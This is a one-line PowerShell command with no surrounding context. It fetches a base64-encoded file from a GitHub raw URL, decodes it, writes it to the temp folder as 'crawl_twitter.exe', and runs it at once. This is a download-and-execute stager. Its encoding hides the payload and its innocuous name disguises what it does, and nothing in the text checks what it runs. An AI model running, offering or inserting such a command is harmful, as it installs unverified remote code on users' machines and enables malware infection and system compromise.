$exePath = "$env:TEMP\crawl_twitter.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/b64"))); & $exePath
